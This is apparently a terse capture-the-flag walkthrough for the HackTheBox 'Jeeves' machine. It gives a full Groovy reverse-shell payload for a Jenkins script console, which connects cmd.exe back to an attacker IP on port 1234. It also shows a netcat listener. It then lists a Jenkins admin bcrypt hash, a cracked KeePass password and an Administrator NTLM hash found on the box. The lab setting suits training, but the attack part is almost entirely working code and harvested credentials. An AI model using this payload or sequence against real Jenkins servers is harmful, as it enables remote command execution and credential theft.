we found this dir http://jeeves.htb:50000/askjeeves/computer/(master)/script
and use this payload 
String host="10.10.14.14";
int port=1234;
String cmd="cmd.exe";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();

nc -lvnp 1234
then in this dir C:\Users\Administrator\.jenkins\users\admin>
 we found config file with this strings:
jbcrypt:$2a$10$QyIjgAFa7r3x8IMyqkeCluCB7ddvbR7wUn1GmFJNO2jQp2k8roehO

then we found CEH.kdbx KeePass file in c:\users\kohsuke\Documents crecked and get pass 'moonshine1' to unlock this file

and get Administrator hash aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00
